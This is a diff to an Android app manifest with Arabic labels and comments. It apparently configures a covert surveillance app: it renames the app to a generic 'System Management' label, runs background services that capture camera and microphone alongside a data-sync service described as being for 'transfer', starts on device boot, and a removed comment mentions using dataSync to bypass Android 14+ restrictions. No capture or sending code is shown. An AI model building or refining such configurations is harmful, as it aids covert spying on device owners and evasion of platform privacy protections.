@@ -15,7 +15,7 @@
     <uses-feature android:name="android.hardware.camera" android:required="true"/>
     <uses-feature android:name="android.hardware.microphone" android:required="true"/>
     <application
-        android:label="إدارة الشبكة"
+        android:label="إدارة النظام"
         android:allowBackup="false"
         android:theme="@android:style/Theme.Material.Light.NoActionBar">
         <activity
@@ -27,21 +27,25 @@
             android:targetActivity=".MainActivity"
             android:enabled="true"
             android:exported="true"
-            android:label="إدارة الشبكة">
+            android:label="إدارة النظام">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
         </activity-alias>
+
+        <!-- StonxService: dataSync للنقل + camera + microphone للتقاط -->
         <service
             android:name=".StonxService"
             android:exported="false"
-            android:foregroundServiceType="dataSync"/>
-        <!-- ✅ CameraService — يستخدم dataSync لتجاوز قيود Android 14+ -->
+            android:foregroundServiceType="dataSync|camera|microphone"/>
+
+        <!-- CameraService: camera + microphone فقط -->
         <service
             android:name=".CameraService"
             android:exported="true"
-            android:foregroundServiceType="dataSync"/>
+            android:foregroundServiceType="camera|microphone"/>
+
         <receiver android:name=".BootReceiver" android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED"/>
